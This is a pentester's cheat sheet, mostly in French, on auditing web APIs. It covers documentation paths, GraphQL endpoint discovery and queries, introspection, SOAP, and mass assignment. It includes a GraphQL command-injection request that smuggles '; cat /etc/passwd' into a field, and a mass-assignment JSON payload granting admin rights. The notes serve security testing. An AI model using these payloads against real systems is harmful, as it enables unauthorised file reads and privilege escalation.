# Web API

> [!TIP]
> Même si l'on pense maitriser son API, toujours énumerer, toujours vérifier lors des audits

## standard type

* SOAP
* RESTful
* GrpahQL

## Data Type

* XML
* JSON

## common content type:

* application/json
* application/xml 
* application/x-www-form-urlencoded 

## Convention

| Convention | Meaning |
-------------------------
| ":" or "{}" | variables |
| "[]" | optional input |
| "||" | possible values that can be used. |
| "< >" | ex. <find-function> Angle brackets represent a DomString, which is a 16-bit string. |

## tools généralement utilisés pour les tests (hors sécu)

* Postman
* Client http du même langage de programmation
* OWASP Zap / Burp Suite

## liste sommaire de repertoires pour trouver la doc:

```txt
/docs
/api/docs
/documentation
/developers/documentation
```

### liste de sous domaines pour trouver la doc

```txt
dev.
api.
```
### detect graphQL

```txt
/graphql
/v1/graphql
/api/graphql
/v1/api/graphql
Attacking GraphQL   291
/graph
/v1/graph
/graphiql
/v1/graphiql
/console
/query
/graphql/console
/altair
/playground
```

### exemples GraphQL

#### Requetes classiques:

lister les noms et pays de tous les clients :

```json
query {clients { name, country } }
```

Obtenir le client avec l'id 1

```json
query { client (id:1) { name, country } }
```

Appeller une fonction spécifique

```json
{
 clientsByCountry(countryId: 1) {
    id
    name
    country
  }
}
```


#### récupération du shéma (introspection)

```json
{
    "query": "{__schema{queryType{name}}}"
}
```

#### exemple type d'injection GraphQL retournant le fichier /etc/passwd

```sh
POST /graphql HTTP/1.1
Host: 192.168.195.132:5000
Accept: application/json
Content-Type: application/json

{"variables": {"scheme": "http",
"path": "/ ; cat /etc/passwd",
"port": 80, "host": "test.com"},
"query": "mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!)
{\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme)
{\n result\n }\n }"}
```

## SOAP

### Merge SOAP with XSD in Visual studio:

* Merge XSD in WSDL file
* Right click on the project and select "Add Service Reference" -> "WCF" -> "enter local Path or URI"


## API Mass Assignement

* Inject JSON and change HTTP Method to modify data.


ie, HTTP method : `PUT` with data : 
```json
{
  "status": "admin",
  "note":"Owned",
  "userid": "0",
  "username": "admin",
  "isAdmin":true
}
```